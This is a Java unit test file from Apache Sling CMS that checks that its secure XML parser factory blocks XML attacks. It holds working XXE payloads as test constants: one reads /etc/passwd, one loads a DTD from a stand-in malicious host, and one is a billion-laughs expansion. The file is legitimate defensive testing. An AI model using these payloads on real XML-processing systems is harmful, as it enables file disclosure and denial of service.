/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.sling.cms.core.internal.security;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import java.io.ByteArrayInputStream;
import java.io.InputStream;

import org.junit.Test;
import org.w3c.dom.Document;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;
import org.xml.sax.helpers.DefaultHandler;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

/**
 * Unit tests for {@link SecureXMLParserFactory}.
 *
 * Tests verify that the secure XML parsers properly block XXE attacks
 * and other XML-based vulnerabilities.
 */
public class SecureXMLParserFactoryTest {

    // XXE attack payloads for testing
    private static final String XXE_EXTERNAL_ENTITY = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" + "<root>&xxe;</root>";

    private static final String XXE_PARAMETER_ENTITY = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            + "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://malicious.com/evil.dtd\"> %xxe;]>" + "<root>data</root>";

    private static final String BILLION_LAUGHS = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            + "<!DOCTYPE lolz [<!ENTITY lol \"lol\">"
            + "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
            + "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">" + "]>"
            + "<root>&lol2;</root>";

    private static final String VALID_XML_NO_DOCTYPE =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><item>test</item></root>";

    @Test
    public void testCreateSecureDocumentBuilderFactory() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();
        assertNotNull("Factory should not be null", factory);

        // Verify security features are enabled
        assertTrue(
                "Secure processing should be enabled",
                factory.getFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING));
        assertFalse("XInclude should be disabled", factory.isXIncludeAware());
        assertFalse("Namespace aware should be disabled", factory.isNamespaceAware());
        assertFalse("Entity references should not be expanded", factory.isExpandEntityReferences());
    }

    @Test
    public void testCreateSecureSAXParserFactory() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();
        assertNotNull("Factory should not be null", factory);

        // Verify security features are enabled
        assertTrue(
                "Secure processing should be enabled",
                factory.getFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING));
        assertFalse("Namespace aware should be disabled", factory.isNamespaceAware());
    }

    @Test
    public void testDocumentBuilderBlocksExternalEntity() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        try (InputStream is = new ByteArrayInputStream(XXE_EXTERNAL_ENTITY.getBytes())) {
            builder.parse(is);
            fail("Should have thrown SAXParseException for external entity");
        } catch (SAXParseException e) {
            // Expected - DOCTYPE should be blocked
            assertTrue(
                    "Error message should mention DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testDocumentBuilderBlocksParameterEntity() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        try (InputStream is = new ByteArrayInputStream(XXE_PARAMETER_ENTITY.getBytes())) {
            builder.parse(is);
            fail("Should have thrown SAXParseException for parameter entity");
        } catch (SAXParseException e) {
            // Expected - DOCTYPE should be blocked
            assertTrue(
                    "Error message should mention DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testDocumentBuilderBlocksBillionLaughs() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        try (InputStream is = new ByteArrayInputStream(BILLION_LAUGHS.getBytes())) {
            builder.parse(is);
            fail("Should have thrown SAXParseException for billion laughs attack");
        } catch (SAXParseException e) {
            // Expected - DOCTYPE should be blocked
            assertTrue(
                    "Error message should mention DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testDocumentBuilderAllowsValidXML() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        try (InputStream is = new ByteArrayInputStream(VALID_XML_NO_DOCTYPE.getBytes())) {
            Document doc = builder.parse(is);
            assertNotNull("Document should be parsed successfully", doc);
            assertEquals(
                    "Root element should be 'root'",
                    "root",
                    doc.getDocumentElement().getNodeName());
        }
    }

    @Test
    public void testSAXParserBlocksExternalEntity() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();
        SAXParser parser = factory.newSAXParser();

        try (InputStream is = new ByteArrayInputStream(XXE_EXTERNAL_ENTITY.getBytes())) {
            parser.parse(is, new DefaultHandler());
            fail("Should have thrown SAXException for external entity");
        } catch (SAXException e) {
            // Expected - DOCTYPE should be blocked
            assertTrue(
                    "Error message should mention DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testSAXParserBlocksParameterEntity() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();
        SAXParser parser = factory.newSAXParser();

        try (InputStream is = new ByteArrayInputStream(XXE_PARAMETER_ENTITY.getBytes())) {
            parser.parse(is, new DefaultHandler());
            fail("Should have thrown SAXException for parameter entity");
        } catch (SAXException e) {
            // Expected - DOCTYPE should be blocked
            assertTrue(
                    "Error message should mention DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testSAXParserBlocksBillionLaughs() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();
        SAXParser parser = factory.newSAXParser();

        try (InputStream is = new ByteArrayInputStream(BILLION_LAUGHS.getBytes())) {
            parser.parse(is, new DefaultHandler());
            fail("Should have thrown SAXException for billion laughs attack");
        } catch (SAXException e) {
            // Expected - DOCTYPE should be blocked
            assertTrue(
                    "Error message should mention DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testSAXParserAllowsValidXML() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();
        SAXParser parser = factory.newSAXParser();

        try (InputStream is = new ByteArrayInputStream(VALID_XML_NO_DOCTYPE.getBytes())) {
            parser.parse(is, new DefaultHandler());
            // Success - no exception thrown
        }
    }

    @Test
    public void testConfigureTikaXMLSecurity() {
        // Store original values
        String originalDocFactory = System.getProperty("javax.xml.parsers.DocumentBuilderFactory");
        String originalSAXFactory = System.getProperty("javax.xml.parsers.SAXParserFactory");

        try {
            // Execute configuration
            SecureXMLParserFactory.configureTikaXMLSecurity();

            // Verify system properties were set
            String docFactory = System.getProperty("javax.xml.parsers.DocumentBuilderFactory");
            assertNotNull("DocumentBuilderFactory should be set", docFactory);
            assertTrue(
                    "DocumentBuilderFactory should be Xerces implementation",
                    docFactory.contains("xerces") || docFactory.contains("DocumentBuilderFactoryImpl"));

            String saxFactory = System.getProperty("javax.xml.parsers.SAXParserFactory");
            assertNotNull("SAXParserFactory should be set", saxFactory);
            assertTrue(
                    "SAXParserFactory should be Xerces implementation",
                    saxFactory.contains("xerces") || saxFactory.contains("SAXParserFactoryImpl"));

        } finally {
            // Restore original values
            if (originalDocFactory != null) {
                System.setProperty("javax.xml.parsers.DocumentBuilderFactory", originalDocFactory);
            }
            if (originalSAXFactory != null) {
                System.setProperty("javax.xml.parsers.SAXParserFactory", originalSAXFactory);
            }
        }
    }

    @Test
    public void testDocumentBuilderWithDocTypeThrowsException() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        String xmlWithDoctype = "<?xml version=\"1.0\"?><!DOCTYPE root><root>data</root>";

        try (InputStream is = new ByteArrayInputStream(xmlWithDoctype.getBytes())) {
            builder.parse(is);
            fail("Should have thrown SAXParseException for DOCTYPE");
        } catch (SAXParseException e) {
            // Expected
            assertTrue(
                    "Error should be about DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testSAXParserWithDocTypeThrowsException() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();
        SAXParser parser = factory.newSAXParser();

        String xmlWithDoctype = "<?xml version=\"1.0\"?><!DOCTYPE root><root>data</root>";

        try (InputStream is = new ByteArrayInputStream(xmlWithDoctype.getBytes())) {
            parser.parse(is, new DefaultHandler());
            fail("Should have thrown SAXException for DOCTYPE");
        } catch (SAXException e) {
            // Expected
            assertTrue(
                    "Error should be about DOCTYPE",
                    e.getMessage().contains("DOCTYPE") || e.getMessage().contains("doctype"));
        }
    }

    @Test
    public void testSecureDocumentBuilderFactoryFeaturesAreSet() throws Exception {
        DocumentBuilderFactory factory = SecureXMLParserFactory.createSecureDocumentBuilderFactory();

        // Verify critical security features
        try {
            boolean disallowDoctype = factory.getFeature("http://apache.org/xml/features/disallow-doctype-decl");
            assertTrue("DOCTYPE should be disallowed", disallowDoctype);
        } catch (Exception e) {
            // Feature might not be queryable on all parsers, skip
        }

        try {
            boolean externalGeneral = factory.getFeature("http://xml.org/sax/features/external-general-entities");
            assertFalse("External general entities should be disabled", externalGeneral);
        } catch (Exception e) {
            // Feature might not be queryable on all parsers, skip
        }
    }

    @Test
    public void testSecureSAXParserFactoryFeaturesAreSet() throws Exception {
        SAXParserFactory factory = SecureXMLParserFactory.createSecureSAXParserFactory();

        // Verify critical security features
        try {
            boolean disallowDoctype = factory.getFeature("http://apache.org/xml/features/disallow-doctype-decl");
            assertTrue("DOCTYPE should be disallowed", disallowDoctype);
        } catch (Exception e) {
            // Feature might not be queryable on all parsers, skip
        }

        try {
            boolean externalGeneral = factory.getFeature("http://xml.org/sax/features/external-general-entities");
            assertFalse("External general entities should be disabled", externalGeneral);
        } catch (Exception e) {
            // Feature might not be queryable on all parsers, skip
        }
    }
}
